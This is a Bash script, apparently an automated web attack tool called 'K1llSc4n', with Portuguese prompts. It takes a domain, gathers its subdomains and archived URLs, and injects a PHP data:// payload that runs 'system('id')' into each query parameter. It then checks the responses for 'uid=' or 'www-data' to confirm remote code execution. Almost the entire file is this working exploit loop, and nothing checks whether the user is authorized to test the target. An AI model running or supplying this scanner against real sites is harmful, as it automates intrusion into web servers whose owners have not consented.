#!/bin/bash
############################################################
# Automatic - Comand Injection - K1llSc4n v0.5 - Bl4dsc4n   #
#############################################################
echo "Digite um dominio"
read dominio
mkdir $dominio
cd $dominio

subfinder -d $dominio -silent | tee -a subdomain

cat subdomain | gauplus -random-agent -b ttf,woff,svg,png,jpg,gif,css,tif,tiff,otf,woff2,ico,jpeg,eot | tee -a links

cat links | qsreplace > parametros2 

awk -F "'" '{print $1 }' parametros2 | sort | uniq > testando2
awk -F "'" '{print $2 }' parametros2 | sort | uniq >> testando2
awk -F "'" '{print $3 }' parametros2 | sort | uniq >> testando2
awk -F "'" '{print $4 }' parametros2 | sort | uniq >> testando2

cat testando2 | sort | uniq | tee -a  parametros0
cat parametros0 | egrep "\=" | tee -a parametros1

for i in $(cat parametros1);do echo $i | grep -o "=" | wc -l > contador;echo $i > parametro; 
parametro=$(cat contador)

if [ "$parametro" == "1" ];
 then
       echo "1 $i"
       awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      
elif  [ "$parametro" == "2" ];
then
      echo "2 $i"	  
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null

elif  [ "$parametro" == "3" ];
then
      echo "3 $i"
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null

elif  [ "$parametro" == "4" ];
then
      echo "4 $i"
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      
elif  [ "$parametro" == "5" ];
then
      echo "5 $i"
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      
elif  [ "$parametro" == "6" ];
then
      echo "6 $i"
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      
elif  [ "$parametro" == "7" ];
then
      echo "7 $i"           
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro| xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"="$7"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null

elif  [ "$parametro" == "8" ];
then
      echo "8 $i"                  
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"="$7"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"="$7"="$8"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
   
elif  [ "$parametro" == "9" ];
then
      echo "9 $i"
      awk -F "=" '{print $1"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"="$7"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null
      awk -F "=" '{print $1"="$2"="$3"="$4"="$5"="$6"="$7"="$8"="$9"=""data://text/plan,%3c?php%20system('id')%20?%3e"}' parametro | xargs -I@ curl -q -s @ -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | egrep "uid=|gid=|groups=|www-data" 2>/dev/null

fi
done